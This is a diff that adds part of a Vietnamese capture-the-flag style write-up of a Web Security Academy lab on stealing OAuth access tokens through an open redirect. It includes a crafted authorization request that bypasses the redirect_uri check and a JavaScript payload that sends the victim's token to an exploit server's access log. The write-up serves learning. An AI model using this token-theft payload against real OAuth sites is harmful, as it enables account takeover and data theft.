@@ -165,3 +165,39 @@ Quan sát request trên Burp:
 <img width="461" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9c129f69-a6ab-4683-86cd-425092defdf9">
 
 - Thử nghiệm thanh đổi giá trị của parametter `redirect_uri` trong request 1 ta xác nhận thấy nếu thay đổi hostname hoặc đường dẫn uri không bắt đầu bằng `oauth-callback` thì request sẽ bị chặn.
+
+- Như vậy không thể truyền thẳng URL độc hại trực tiếp luồn vào biến `redirect_uri` mà cần phải đi tìm cách khác. => Tính năng chuyển sang bài post kế tiếp có thể lợi dụng để truyền vào URL, cụ thể như sau:
+
+<img width="494" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a3b96115-7e75-46fd-a095-37027745b20c">
+
+- Kết hợp lại ta có thể craft được payload như sau để bypass cơ chế check của biến `redirect_uri`:
+`GET /auth?client_id=ubkeow5ujb9t28n9t7qdz&redirect_uri=https://0a2000840427abf8802e9955008900a1.web-security-academy.net/oauth-callback/../post/next?path=https%3A%2F%2Fexploit-0a6200800401abb4805a987e01680095.exploit-server.net%2Fexploit&response_type=token&nonce=1721753949&scope=openid%20profile%20email`
+
+=> Đã có cách để redirect trình duyệt của victim đến chỗ khác, ngoài ra request redirect này sẽ có chứa giá trị của token ở sau dấu `#`. Ví dụ: `https://0a2000840427abf8802e9955008900a1.web-security-academy.net/oauth-callback/../post/next?path=https%3A%2F%2Fexploit-0a6200800401abb4805a987e01680095.exploit-server.net%2Fexploit#access_token=ndwGfvuYsDzBhk1CzXjRNoF60DyPWU2tuJxmT1Hd_7J&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`.
+
+- Trên exploit server, dùng payload như sau:
+
+```javascript
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+
+Giải thích: đoạn `window.location = '/?'+document.location.hash.substr(1)` thì `window.location` là giá trị URL hiện tại. `document.location.hash.substr(1)` sẽ là giá trị ở sau dấu `#` đầu tiên có trọng URL. Ví dụ: `http://example.com/#section1` sẽ trở thành `http://example.com/?section1`
+=> Nếu ban đầu chưa có link URL chứa ký tự `#` thì sẽ redirect trình duyệt người dùng vào link `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email`. Khi này victim sẽ lại được redirect về link `exploit` trên Exploit Server lần nữa, tuy nhiên sẽ kèm theo giá trị value token đằng sau ký tự `#`. Lúc này `window.location = '/?'+document.location.hash.substr(1)` sẽ thực hiện chuyển đổi `#` thành `?` => Chúng ta sẽ thu được giá trị token này trong access log của Exploit Server.
+
+<img width="630" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4b310bc0-25d6-4e64-92be-b3b044af1fa9">
+
+- Với giá trị token thu được, gửi request vào link `/me`:
+
+<img width="491" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/14bbc6d3-bf51-4a0f-9356-db1aad732d37">
+
+- Submit api key thu được & Lab Resolved!
+
+<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3cb15e1c-6119-4148-8f6d-318e54148f2c">
+
+
